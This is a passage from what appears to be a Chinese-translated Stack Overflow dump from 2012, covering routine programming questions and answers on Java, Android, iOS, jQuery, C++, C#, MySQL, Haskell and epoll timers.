对于只有数字的输入，请使用带[数字的](http://msdn.microsoft.com/en-us/library/system.windows.input.inputscopenamevalue%28v=vs.95%29.aspx)[输入范围](http://www.jeffblankenburg.com/2010/10/10/31-days-of-windows-phone-day-10-inputscope-textboxes/)

要将输入保存为变量，请使用[TextChanged 事件](http://msdn.microsoft.com/en-us/library/system.windows.controls.textbox.textchanged%28v=vs.95%29.aspx)或查询值作为`string value = textBox1.Text`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T09:31:09.360

对于第二个问题，像这样为 TextBox 使用输入空间

```
<TextBox InputScope="Number" Name="input1" ></TextBox> 
```

要保存用户输入，您必须命名您的 TextBox，然后简单地保存该`input1.Text`属性。如果您想保存它，以便下次您的应用启动时用户可以恢复它，然后使用`IsolatedStorageSettings`保存它。

# java - 类实例共享数据成员的值

> ID：10772151
> 
> 赞同：1
> 
> 时间：2012-05-27T06:41:08.350
> 
> 标签：java, datamember

我正在编写一个程序来显示列表多项选择问题。我的 java 类的 ChoiceString 数据成员中存储的值有问题。类的每个实例都应该有自己的 ChoiceString 值，但由于某种原因，ChoiceString 只保存第一个实例初始化的值并与其他实例共享，我希望每个实例都有自己的 ChoiceString 唯一值。我该如何解决？

以下是我的代码：

```
 public class AllChoiceQuestion extends ChoiceQuestion{

  private String note = "Note: The following question has one or more correct choices\nYou must give the number(s) of ALL correct anwers, in order,\nto get full credit andsperated by spaces";
  private int count =0;
      // A varabile that will hold the user answer 
  private String choiceString;

public AllChoiceQuestion(String questionText) {
    // initilize the question text value
            super(questionText);
    choiceString="";

}

   public void addChoice(String choice, boolean correct){
       super.addChoice(choice, correct);
       if(correct == true){
           count++;
           choiceString +=   "" + count+" " ;
            }
       super.setAnswer(choiceString.trim());
       }

   public void display(){
      System.out.println(note);
      super.display();
   }

   public String toString(){
       return note +"\n"+ super.toString();

   }
 } 
```

这是我的实例的代码

```
 ChoiceQuestion allchoicequestion1 = new AllChoiceQuestion("Which of the basic data type(s) has the size of 16 bit?");
      allchoicequestion1.addChoice("Char", true);
      allchoicequestion1.addChoice("Short", true);
      allchoicequestion1.addChoice("Float", false);
      allchoicequestion1.addChoice("Double", false);

      ChoiceQuestion allchoicequestion2 = new AllChoiceQuestion("Which of the basic data type(s) has the size of 64 bit?");
      allchoicequestion2.addChoice("Long", false);
      allchoicequestion2.addChoice("Doulbe", false);
      allchoicequestion2.addChoice("Byte", true);
      allchoicequestion2.addChoice("Int", true); 
```

**所以 allChoiceQuestion1 的 ChoiceStrng 应该是 1 2 而 ChoiceString forallChoiceQuestion2 应该是 3 4 但每次我 tyee 3 4 作为 forallChoiceQuestion2 的答案时，它都会给我一个错误的答案，但如果我输入 1 2 它是正确的**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T07:15:49.357

`correct`问题是当变量为假时你没有增加计数。因此，选择字符串将始终为 1 2。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T06:51:07.567

每次在构造函数中都将choiceString 初始化为“”。

尝试

```
choiceString = questionText; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T06:52:07.263

您需要扩展`AllChoiceQuestion`并拥有它的子类，`NumberChoiceQuestion`并且`StringChoicQuestion`它们将有自己的实现`choiceString`，您需要`choiceString`在子类中重载实现并创建子类的对象，这样您就可以让您的子类特定`choiceString`

* * *

```
 public class NumberChoiceQuestion extends AllChoiceQuestion{
        this.choiceString; // Over written value of choiceString specific to NumberChoiceQuestion
    }

public class StringChoiceQuestion extends AllChoiceQuestion{
        this.choiceString; // Over written value of choiceString specific to StringChoiceQuestion
    } 
```

# android - Android将图像缩放到最大尺寸

> ID：10772157
> 
> 赞同：2
> 
> 时间：2012-05-27T06:43:24.793
> 
> 标签：android, imageview, scale

嗨，我正在开发一个将加载图像的应用程序，我希望将每个图像缩放到最大可能的尺寸，例如，如果图像是横向图像（如果宽度大于高度）我想拉伸宽度填充手机的宽度并缩放高度以保持其纵横比。如果高度大于宽度，即纵向图像，则应缩放图像以适合手机的高度，然后应调整宽度以保持纵横比，我在使其正常工作时遇到了一些麻烦，这就是我到目前为止，我们将不胜感激任何帮助。

```
 final ImageView i = new ImageView(mContext);
            i.setImageResource(mImageIds[position]);
            i.setBackgroundResource(android.R.color.black);
            //TODO need to get actual size of drawable not view size which is 0
            ViewTreeObserver vto = i.getViewTreeObserver();
            vto.addOnPreDrawListener(new ViewTreeObserver.OnPreDrawListener() {
                public boolean onPreDraw() {
                    int w = i.getMeasuredWidth();
                    int h = i.getMeasuredHeight();
                    Display display = getWindowManager().getDefaultDisplay(); 
                    int width = display.getWidth();
                    int height = display.getHeight();
                    if(w <= h){
                        //TODO need to think about landscape
                        h = height - convertDpToPixel(50, context);
                        w = w*(width);
                    }else{
                        h = h*(height);
                        w = width;
                    }
                    //TODO set imageview to w and h

                    return true;
                }
            }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:48:22.647

将高度或宽度增加到最大值，具体取决于哪个已经更大。

现在，假设您正在使用横​​向图像：

您已经将宽度扩展到了最大尺寸，即显示器的宽度

您展开的一侧是图像的宽度，因此假设显示宽度=宽度并且图像的宽度= w：

宽度 / w = r

所以 r 将是显示宽度和图像宽度之间的比率。现在你需要用它来增加你的身高。

只需将高度乘以比率，然后将图像的新高度设置为结果数字。

如果你最终得到一个肖像图像......好吧，我想你能弄清楚。这几乎是一回事。

毕竟，我认为这只是将图像定位在屏幕中央的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:26:36.187

获取显示宽度、高度

```
DisplayMetrics displaymetrics = new DisplayMetrics();
    getWindowManager().getDefaultDisplay().getMetrics(displaymetrics);
    int height = displaymetrics.heightPixels;
    int wwidth = displaymetrics.widthPixels; 
```

调整图像视图大小

```
ImageView img=(ImageView)findViewById(R.id.ImageView01);
Bitmap bmp=BitmapFactory.decodeResource(getResources(), R.drawable.sc01);
Bitmap resizedbitmap=Bitmap.createScaledBitmap(bmp, width, height, true);
img.setImageBitmap(resizedbitmap); 
```

# swing - 如何使用 NetBeans 的 JProgressBar？

> ID：10772158
> 
> 赞同：-1
> 
> 时间：2012-05-27T06:43:25.240
> 
> 标签：swing, netbeans, jprogressbar

我正在使用 Netbeans gui，快速轻松的拖放，假设创建了一个 JButton，将其命名为“Start”，我为此 JButton 添加了一个事件（ActionPerformed），所以我得到了以下方法

```
private void JButtonActionPerformed(java.awt.event.ActionEvent evt)     
{                                             
    // TODO add your handling code here:
} 
```

然后我添加了一个JProgressBar，我希望这个进度条在我点击这个按钮时启动，并且能够控制它的速度......等等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:05:31.640

你不能直接设置它的速度，你只需要设置它的值。阅读[文档](http://docs.oracle.com/javase/6/docs/api/javax/swing/JProgressBar.html)了解详细信息。BTW JProgressBar 并不是真正的Netbeans 特定的，它是标准的swing gui 工具包。

# networking - 如何从 iOS 设备登录网站？

> ID：10772163
> 
> 赞同：0
> 
> 时间：2012-05-27T06:44:49.130
> 
> 标签：networking, ios5

与我一起工作的人创建了一个他想用来提供服务的网站。当用户点击检查用户名/密码/等的登录时，他们会运行一个 php 脚本

现在我想编写一个允许登录和检索数据的应用程序，就像在网站上一样。如何将登录信息从 iOS 设备传递到网站上运行的 PHP 脚本？登录后，如何查看和检索数据？

我需要向他索要 API 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:22:54.957

```
responseData = [[NSMutableData data] retain];

NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://www.yourwebsite.com/login.php"]];

NSString *params = [[NSString alloc] initWithFormat:@"user=myuser&pass=mypass"];
[request setHTTPMethod:@"POST"];
[request setHTTPBody:[params dataUsingEncoding:NSUTF8StringEncoding]];
[[NSURLConnection alloc] initWithRequest:request delegate:self]; 
```

# javascript - HTML DOM 警报 style.width

> ID：10772168
> 
> 赞同：1
> 
> 时间：2012-05-27T06:45:57.830
> 
> 标签：javascript, jquery, html, dom

> **可能重复：**
> [以像素为单位获取元素宽度](https://stackoverflow.com/questions/5525049/get-element-width-in-px)

如何找到 divA 的宽度？此代码会弹出一个空警报弹出窗口。

```
<script type="text/javascript">

function DisplayResult(){
    width = document.getElementById("divA").style.width;
    alert(width);
}
var widthFinder = {   
    find: DisplayResult
};
widthFinder.find();

</script>

<div id="divA">Alert this string's length in pixels</div> 
```

编辑：

这现在警告“null”。仍然不是我所希望的。

```
<html>
<head>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript">

function DisplayResult(){
var width = $("#divA").width();
alert(width);
}
var widthFinder = {   
find: DisplayResult
};
widthFinder.find();

</script>

<div id="divA" style="display:inline; width:100%;">Alert this string's length in pixels</div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T06:48:22.247

你总是可以使用[jQuery](http://jquery.com/)

```
alert($("#divA").width()); 
```

或者您可以尝试这种方式并将 diva 的宽度存储在变量中

```
var width = $("#divA").width());
alert(width); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-27T07:48:46.360

您的代码设置为在 DOM 准备好之前执行，因此它没有找到任何元素并返回一个`null`值。

```
function DisplayResult(){ //declared function in the document's head, ok
    var width = $("#divA").width();
    alert(width);
}

$(document).ready(function(){ //function calls here, when the DOM is ready
    var widthFinder = {   
    find: DisplayResult()
    };
    widthFinder.find();
}); 
```

我已将您的函数调用包装在[`$(document).ready()`](http://api.jquery.com/ready/)事件中，以防止在 DOM 准备好之前执行代码。我还添加`()`了`DisplayResult()`以确保它被解释为函数调用。

试试这个[***JSFiddle***](http://jsfiddle.net/gd2gd/2/)示例。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T07:43:58.363

使用 jQuery，你想要的可以很容易地完成并且有两种方法：

*   一，正如已经回答的那样，你可以做

    `alert($("#divA").width());`

这会将宽度作为单个数字返回。如果宽度为 600 像素，则返回 600。

*   其次，您可以使用[.css](http://api.jquery.com/css/)属性来获取宽度

    `alert($("#divA").css("width"));`

这将返回与 css 文件中给出的宽度完全相同的宽度。如果宽度是 600 像素，那么它将返回 600 像素而不仅仅是 600。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-27T07:46:26.787

对于非 Jquery 版本。尝试在`onload`发生后延迟函数调用。例如：

```
window.onload = function(){
    DisplayResult();
} 
```

# c++ - 调用同名函数

> ID：10772169
> 
> 赞同：8
> 
> 时间：2012-05-27T06:46:03.257
> 
> 标签：c++, class, function, include, duplicates

是否可以在不将函数名称 Foo::foo() 更改为 Foo::newfoo() 的情况下从 Foo.cpp 调用 foo() 函数。

**主文件**

```
#include <iostream>
#include "Foo.hpp"

class Foo {
public:
    void foo() {
        std::cout << "Foo::foo\n";
    }
    void bar() {
        std::cout << "Foo::bar\n";
        foo();// need to call foo() function from foo.cpp not Foo::foo()
    }
};

int main () {
    Foo f;
    f.bar();
    return 0;
} 
```

**Foo.hpp**

```
#ifndef FOO_HPP_INCLUDED
#define FOO_HPP_INCLUDED

void foo();

#endif // FOO_HPP_INCLUDED 
```

**Foo.cpp**

```
#include "Foo.hpp"
#include <iostream>
void foo(){
    std::cout << "foo\n";
} 
```

ps.对不起我的英语不好。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-27T06:50:00.573

使用自由函数的完全限定名称。

```
::foo(); 
```

`::`函数名前面的 ，告诉编译器通过全局范围内的名称调用函数`foo()`。
如果自由函数位于其他命名空间中，则需要使用完全限定名称来指定命名空间`foo()` *。*

```
namespacename::foo(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T06:52:29.913

`foo`如果在某个命名空间中定义了自由函数`xyz`，则执行以下操作：

```
 xyz::foo();  //if foo is defined in xyz namespace 
```

否则就这样做：

```
::foo();     //if foo is defined in the global namespace 
```

这个假设`foo`是在全局命名空间中定义的。

**最好为您的实现使用命名空间。避免污染全局命名空间。**

# c# - 如何在 for 循环中编写数组列表？

> ID：10772172
> 
> 赞同：1
> 
> 时间：2012-05-27T06:46:54.337
> 
> 标签：c#, arrays, for-loop

嗨，我需要循环执行此操作，但我不知道该怎么做。我不能通过简单地增加它来做到这一点。

```
CheckBox[] checkboxarray;

checkboxarray = new CheckBox[] { 
    txtChckBx0,  txtChckBx1,  txtChckBx2,  txtChckBx3,  txtChckBx4,  txtChckBx5, 
    txtChckBx6,  txtChckBx7,  txtChckBx8,  txtChckBx9,  txtChckBx10, txtChckBx11, 
    txtChckBx12, txtChckBx13, txtChckBx14, txtChckBx15, txtChckBx16, txtChckBx17, 
    txtChckBx18, txtChckBx19, txtChckBx20, txtChckBx21, txtChckBx22, txtChckBx23, 
    txtChckBx24, txtChckBx25, txtChckBx26, txtChckBx27, txtChckBx28, txtChckBx29, 
    txtChckBx30, txtChckBx31, txtChckBx32, txtChckBx33, txtChckBx34, txtChckBx35, 
    txtChckBx36, txtChckBx37, txtChckBx38, txtChckBx39, txtChckBx40, txtChckBx41, 
    txtChckBx42, txtChckBx43, txtChckBx44, txtChckBx45, txtChckBx46, txtChckBx47, 
    txtChckBx48, txtChckBx49, txtChckBx50, txtChckBx51, txtChckBx52, txtChckBx53,
    txtChckBx54, txtChckBx55, txtChckBx56, txtChckBx57, txtChckBx58, txtChckBx59, 
    txtChckBx60, txtChckBx61, txtChckBx62, txtChckBx63, txtChckBx64, txtChckBx65, 
    txtChckBx66, txtChckBx67, txtChckBx68, txtChckBx69, txtChckBx70, txtChckBx71, 
    txtChckBx72, txtChckBx73, txtChckBx74, txtChckBx75, txtChckBx76, txtChckBx77, 
    txtChckBx78, txtChckBx79, txtChckBx80
}; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T06:52:37.610

如果您知道复选框都在表单上：

```
var list = new List<CheckBox>();
foreach(var control in this.Controls)
{
    var checkBox = control as CheckBox;
    if(checkBox != null)
    {
        list.Add(checkBox);
    }
}

var checkBoxArray = list.ToArray(); 
```

如果您不知道控件在哪里，那么您将不得不搜索它们。

顺便说一句：上面的代码使用 WinForms。如果您使用的是 WPF、Silverlight、Metro 等，则容器的名称会有所不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:02:02.583

在 WinForm 中

```
List<CheckBox> checkBox = new List<CheckBox>();
// Adding checkboxes for testing...
for (int i = 0; i <= 80; i++)
{
    var cbox = new CheckBox();
    cbox.Name = "txtChckBx"+ i.ToString();
    checkBox.Add(cbox);
    Controls.Add(cbox);

}

List<CheckBox> checkBoxfound = new List<CheckBox>();
// loop though all the controls 
foreach (var item in Controls)
{
    // filter for checkboxes and name should start with "txtChckBx"
    if (item is CheckBox && ((CheckBox)item).Name.StartsWith("txtChckBx", StringComparison.OrdinalIgnoreCase))
    {
        checkBoxfound.Add((CheckBox)item);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T06:52:35.787

你不能做新的然后

```
checkboxarray = new CheckBox[] { txtChckBx0, ....} 
```

这是定义数组的两种不同方式。你需要做：

```
CheckBox[] checkboxarray = { txtChckBx0, ....}; 
```

如果你想让它工作。

祝你好运。

# iphone - 在 iOS 上，如果一个视图有多个层，drawRect 可以只选择一个层来显示吗？

> ID：10772177
> 
> 赞同：2
> 
> 时间：2012-05-27T06:49:08.607
> 
> 标签：iphone, ios, uiview, calayer, drawrect

在iOS上，如果一个view有好几层，那么该`drawRect`方法是否可以选择任意一层显示，1秒后选择另一层显示，实现动画效果？

现在，我有几个图层，但我不认为它们是视图的图层（它们只是单独的图层，不是父图层的子图层），因为我只是使用创建它们

```
CGLayerCreateWithContext(context, self.view.bounds.size, NULL); 
```

在 中`drawRect`，我使用

```
CGContextDrawLayerAtPoint(context, self.bounds.origin, layer1); 
```

将图层绘制到视图上......它可以工作，但这不是像在图层上绘制图层（在视图图层上绘制图层）吗？没有更快的方法，那就是告诉视图使用`layer1`or `layer2`，有点像

```
self.layer = layer1; 
```

但它不能，因为它`layer`是只读的。这可以实现吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T07:20:11.470

您正在尝试使用绘图方法绘制`CALayer`对象。`CGLayer`这些是不同的东西，不能互换使用。但是，如果我正确理解了您的问题，那么您完全不需要使用`drawRect:`一段时间后在图层之间切换。这是我的基本工作代码示例：

```
#import <QuartzCore/QuartzCore.h>

@interface TTView {
    NSUInteger index;
    NSArray *layers;
    CALayer *currentLayer;
}

@end

@implementation TTView

- (void)switchView {
    // Remove the currently visible layer
    [currentLayer removeFromSuperlayer];

    // Add in the next layer
    currentLayer = [layers objectAtIndex:index];
    [self.layer addSublayer:currentLayer];

    // Increment the index for next time
    index += 1;
    if (index > [layers count] - 1) {
        // If we have reached the end of the array, go back to the start. You can exit the loop here by calling a different method followed by return;
        index = 0;
    }

    // Call this method again after 1 second
    [self performSelector:@selector(switchView) withObject:nil afterDelay:1];
}

- (id)initWithCoder:(NSCoder *)aDecoder {
    // Basic initialisation. Move this to whatever method your view inits with.
    self = [super initWithCoder:aDecoder];
    if (self) {
        // Create some random objects with layers to display. Place your layers into the array here.
        UIView *a = [[UIView alloc] initWithFrame:self.bounds];
        a.backgroundColor = [UIColor redColor];
        UIView *b = [[UIView alloc] initWithFrame:self.bounds];
        b.backgroundColor = [UIColor greenColor];
        UIView *c = [[UIView alloc] initWithFrame:self.bounds];
        c.backgroundColor = [UIColor blueColor];

        // Add the layers to the array.
        layers = [[NSArray alloc] initWithObjects:a.layer, b.layer, c.layer, nil];
        // Call the method to start the loop.
        [self switchView];
    }
    return self;
} 
```

显然，您应该用您计划以这种方式制作动画的任何图层替换我的 3 个纯色视图，并可能整理实例变量。这只是一个基本的代码示例，可以满足您的需求。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T08:08:47.213

遵循@PartiallyFinite 的示例，通过将视图的图层`contents`属性设置`CGImage`为您选择的 a，这是获得相同效果的类似方法。

这比`-drawRect:`在那里覆盖和绘制更有效，因为它避免了额外的绘制操作并上传到视频硬件。

```
#import <QuartzCore/QuartzCore.h>

@interface TTView {
    NSUInteger index;
    NSMutableArray *images;
}

@end

@implementation TTView

- (id)initWithCoder:(NSCoder *)aDecoder {
    // Basic initialisation. Move this to whatever method your view inits with.
    self = [super initWithCoder:aDecoder];
    if (self) {
        // Create some random images to display. Place your images into the array here.
        CGSize imageSize = self.bounds.size;        
        images = [[NSMutableArray alloc] init];
        [images addObject:[self imageWithSize:imageSize color:[UIColor redColor]]];
        [images addObject:[self imageWithSize:imageSize color:[UIColor greenColor]]];
        [images addObject:[self imageWithSize:imageSize color:[UIColor blueColor]]];

        [self switchView];
    }
    return self;
}

- (UIImage*)imageWithSize:(CGSize)imageSize color:(UIColor*)color {
    UIGraphicsBeginImageContext(imageSize);

    // Draw whatever you like here. 
    // As an example, we just fill the whole image with the color.
    [color set];
    UIRectFill(CGRectMake(0, 0, imageSize.width, imageSize.height));

    UIImage* image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return image;
}

- (void)switchView {
    UIImage* image = [images objectAtIndex:index];
    self.layer.contents = (id)(image.CGImage);

    index = (index + 1) % images.count;

    [self performSelector:@selector(switchView) withObject:nil afterDelay:1];
}

// DO NOT override -drawRect:, and DO NOT call -setNeedsDisplay.
// You're already providing the view's contents.

@end 
```

# javascript - 在 webbrowser 中使用 javascript 在 acrobat reader 中切换页面

> ID：10772187
> 
> 赞同：3
> 
> 时间：2012-05-27T06:52:23.190
> 
> 标签：javascript, internet-explorer, acrobat

对于一个项目，我正在寻找一种在网络浏览器（IE8 和更新版本）中显示 pdf 文件的好方法。我项目中使用的浏览器安装了 acrobat reader，因此这将是可视化 pdf 文件的首选方式。

有没有办法访问当前在 div 中打开的 acrobat reader 以（例如）切换页面或跳转到给定的书签？是否也可以监听文本选择事件？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T08:14:47.573

我不确定您是否可以从页面外部控制 PDF。然而，[pdf.js](https://github.com/mozilla/pdf.js)是一个用 Javascript 编写的 PDF 渲染器。它允许您在页面中嵌入 PDF 查看器并完全控制它，包括翻页等。它可能正是您正在寻找的！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T13:40:33.973

在解决这个问题一段时间后，我现在使用以下解决方案：

*   使用 pdfObject.js 将 pdf 文件嵌入到我的网页中。
*   使用 HostContainer 在 pdf 和 html 之间进行通信。重要的是，您可以在 PDF 文件中添加一些 javascript。
*   重要提示是，这仅适用于嵌入式 Acrobat Reader/Pro 版本。
*   见：[http](http://www.javabeat.net/articles/print.php?article_id=301) ://www.javabeat.net/articles/print.php?article_id=301 ）

祝你好运。如果您遇到问题，请留言，也许我可以提供帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-14T11:59:10.110

这不会解决您的所有功能请求，但您可能需要查看[PDF 打开参数](http://partners.adobe.com/public/developer/en/acrobat/PDFOpenParameters.pdf)。如果您使用适当的 hash-url 打开一个 pdf，您可以控制阅读器的行为。

例如，以下将打开一个 PDF 并转到该 pdf 的第三页：

```
http://example.org/doc.pdf#page=3 
```

# mysql - MySQL 替代使用两个嵌套查询

> ID：10772197
> 
> 赞同：2
> 
> 时间：2012-05-27T06:53:40.867
> 
> 标签：mysql, nested-queries

我正在尝试了解 MYSQL 联接，但无法弄清楚这一点。我想获取 table1 中 userID 与给定用户有关系的所有行。

table2 包含用户关系，因此 userID 可以在 iduser1 字段或 iduser2 字段中我有以下查询，它给了我正确的结果：

```
set @userID = 91;
SELECT * FROM table1
    WHERE (iduser IN (SELECT iduser1 FROM table2 WHERE iduser2 = @userID)
        OR (iduser IN (SELECT iduser2 FROM table2 WHERE iduser1 = @userID)))

table1: 
    iduser FK

table2:
    iduser1 FK
    iduser2 FK 
```

有人告诉我，MySQL 中的嵌套查询在性能方面名声不佳，我确信我可能会以某种方式使用 JOINS 执行相同的查询，但我无法弄清楚，特别是因为 table1.x 有一个 OR 语句。 iduser 可以在 table2.iduser1 或 table2.iduser2 中

我怎样才能加入同一张桌子两次？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T07:22:23.210

给定这个表达式：

```
set @userID = 91;
SELECT * FROM table1
    WHERE (iduser IN (SELECT iduser1 FROM table2 WHERE iduser2 = @userID)
        OR (iduser IN (SELECT iduser2 FROM table2 WHERE iduser1 = @userID))) 
```

使用 EXISTS，您可以将这两个子查询减少为以下内容：

```
set @userID = 91;
SELECT * FROM table1 x
WHERE EXISTS(
    select * from table2 z
    where (z.user2 = @userID and iduser1 = x.iduser)
       OR (z.user1 = @userID and iduser2 = x.iduser)
) 
```

OR 可能会减慢您的查询速度，它不一定会在 RDBMS 中短路。在这种情况下，您应该尝试使用 CASE WHEN 将其短路。我有一个查询在使用 OR 时需要 5 秒才能执行，但当我将其转换为 CASE WHEN 时需要不到零秒：

```
set @userID = 91;
SELECT * FROM table1 x
WHERE EXISTS(
    select * from table2 z
    where 
       CASE WHEN z.user2 = @userID THEN
           IF(z.iduser1 = x.iduser, 1, 0)
       CASE WHEN z.user1 = @userID THEN 
           IF(z.iduser2 = x.iduser, 1, 0)
       END = 1
) 
```

布尔表达式自动转换为整数（0（假）或 1（真）），所以你也可以这样做：

```
set @userID = 91;
SELECT * FROM table1 x
WHERE EXISTS(
    select * from table2 z
    where 
       CASE WHEN z.user2 = @userID THEN
           z.iduser1 = x.iduser
       CASE WHEN z.user1 = @userID THEN 
           z.iduser2 = x.iduser
       END = 1
) 
```

或这个：

```
set @userID = 91;
SELECT * FROM table1 x
WHERE EXISTS(
    select * from table2 z
    where 
       CASE WHEN z.user2 = @userID THEN
           z.iduser1 = x.iduser
       CASE WHEN z.user1 = @userID THEN 
           z.iduser2 = x.iduser
       END 
) 
```

* * *

如果你不使用 MySQL，你应该这样做：

```
set @userID = 91;
SELECT * FROM table1 x
WHERE EXISTS(
    select * from table2 z
    where 
       CASE WHEN z.user2 = @userID THEN
           CASE WHEN z.iduser1 = x.iduser THEN 1 END
       CASE WHEN z.user1 = @userID THEN 
           CASE WHEN z.iduser2 = x.iduser THEN 1 END
       END = 1
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-28T07:31:10.500

让我反对 MySQL 不仅对子查询而且对 EXISTS 和 OR 的处理很差。因此，我会建议一种不同的方法来解决这个问题。

由于查询中的参数由于用户变量而已知，因此我们可以准备可连接查询。

```
set @userID = 91;

SELECT DISTINCT T1.* FROM table1 T1
LEFT JOIN (SELECT iduser1 FROM table2 WHERE iduser2 = @userID) T21 
ON (T1.iduser = T21.iduser1)
LEFT JOIN (SELECT iduser2 FROM table2 WHERE iduser1 = @userID) T22 
ON (T1.iduser = T22.iduser2)
; 
```

如您所见，EXISTS 和 OR 由 LEFT JOIN 完美实现，它与第二个表中的其他用户搜索每个匹配项（如果有）。显然，table1 中的同一用户可以找到多个匹配项，因此 DISTINCT 可能会解决问题并删除重复项。

我建议您尽可能使用 JOIN 来利用 MySQL。

# haskell - Haskell 中的有界计算

> ID：10772200
> 
> 赞同：8
> 
> 时间：2012-05-27T06:54:42.223
> 
> 标签：haskell, ghc

Haskell 中是否有任何方法（如果重要，使用 GHC，对于需要在 Linux 和 Windows 上运行的代码）来执行有界计算？也就是说，“如果可行，则计算此函数的结果，但如果尝试使用了超过 X 个 CPU 周期、Y 个堆栈空间或 Z 个堆空间，并且仍然没有完成，则停止并返回一个指示它无法完成计算”？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-27T07:06:36.710

```
System.Timeout.timeout :: Int -> IO a -> IO (Maybe a) 
```

[http://lambda.haskell.org/hp-tmp/docs/2011.2.0.0/ghc-doc/libraries/base-4.3.1.0/System-Timeout.html#v:timeout](http://lambda.haskell.org/hp-tmp/docs/2011.2.0.0/ghc-doc/libraries/base-4.3.1.0/System-Timeout.html#v:timeout)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-27T09:30:57.787

*这是您可以*尝试的一个骇人听闻的解决方案：使用 生成您的计算`forkIO`，并让父线程（或可以访问分叉线程的监视线程`ThreadId`）定期轮询您想要的任何数量，并向计算线程抛出一个异步异常根据需要（有趣的是，这正是它的`timeout`工作原理。）

下一个问题是是否有办法从 Haskell 中找出当前堆有多大。您可以通过生成 shell 命令或以其他方式查询操作系统来找出总内存消耗和周期（我不知道如何在 Windows 上做到这一点。）

这不是一个完美的解决方案，但它是一个简单的解决方案，您可以在几分钟内实施和测试。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-05-27T14:46:07.923

在每个进程级别上，您可以使用[GHC 的 RTS 选项](http://www.haskell.org/ghc/docs/7.4.1/html/users_guide/runtime-control.html)来控制最大堆栈和堆大小。

# javascript - jQuery UI 对话框中的 iframe

> ID：10772203
> 
> 赞同：0
> 
> 时间：2012-05-27T06:55:49.357
> 
> 标签：javascript, jquery

我在 jquery UI 对话框中有一个 iframe，将其 src 设置为 doument.ready 事件：

```
 $(document).ready(function() {
     $("#iframe").attr("src", whatever);
     $("#button").click(function() { $("#dialog").dialog(); });
    });

    <div id="dialog">
     <iframe src="" id="iframe"></iframe>
    <div> 
```

一切都很好，当我`click over the button dialog open`只是`the problem`它`loads iframe content everytime when dialog open`。我`want to stop`这种行为和。我该`load the contents only once at document.ready event`怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T07:09:10.903

使用另一个 iframe，隐藏，然后在对话框打开时将其内容复制到对话框中的 iframe。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-27T07:24:10.157

问题是 JqueryUI 在您关闭对话框时会破坏它。

这是一个简单的解决方法：[https ://stackoverflow.com/a/9128123/477176](https://stackoverflow.com/a/9128123/477176)

# sql - 按计数排序 SQL 报告服务

> ID：10772204
> 
> 赞同：1
> 
> 时间：2012-05-27T06:55:52.550
> 
> 标签：sql, sql-server, reporting-services

我在小报控件中有一个简单的查询，可以在一个月内获得所有潜在客户。然后我使用小报控件将它们分组为主要来源。然后我有一个关联的计数列。我想按计数降序对报告进行排序，而不是在查询中进行。我不断收到一条错误消息，说您无法对聚合进行排序。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T07:23:35.437

你可以再做一件事..只需在子查询部分编写查询并在外部查询中编写 order by 子句。

（假设您按查询分组如下-

```
select lead_source, count(*) cnt
from your_table 
group by lead_source 
```

)

所以你可以这样做 -

```
select lead_source, cnt from (
    select lead_source, count(*) cnt
    from your_table 
    group by lead_source
    )
order by cnt 
```

这个 your_table 和按列分组的列表，您必须相应地编辑您的表结构..

# c - epoll 和超时

> ID：10772208
> 
> 赞同：3
> 
> 时间：2012-05-27T06:56:46.830
> 
> 标签：c, events, epoll

我正在使用 epoll 来管理大约 20 到 30 个套接字。我发现 epoll_wait 可用于等待一些数据通过其中一个套接字到达，但我错过了如何在套接字级别实现超时。我可以在 epoll_wait 上使用超时，但在我的情况下它不是很有用。例如，如果我需要每次关闭一个超过 500 毫秒没有记录活动的套接字，或者无论如何都可能每 200 毫秒向一个套接字发送一些数据。如何使用 epoll 实现这些套接字级别的超时？任何建议和想法将不胜感激！

谢谢， 希瓦姆卡拉

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-08-26T23:47:58.963

尝试将每个套接字与计时器 fd 对象 ( [`timerfd_create`](http://linux.die.net/man/2/timerfd_create)) 配对。对于应用程序中的每个套接字，创建一个最初设置为在 500 毫秒后过期的计时器，*并将计时器添加到 epoll 对象*（与套接字相同——通过`epoll_ctl`和`EPOLL_CTL_ADD`）。然后，每当数据到达套接字时，将该套接字的关联计时器重置为 500 毫秒超时。

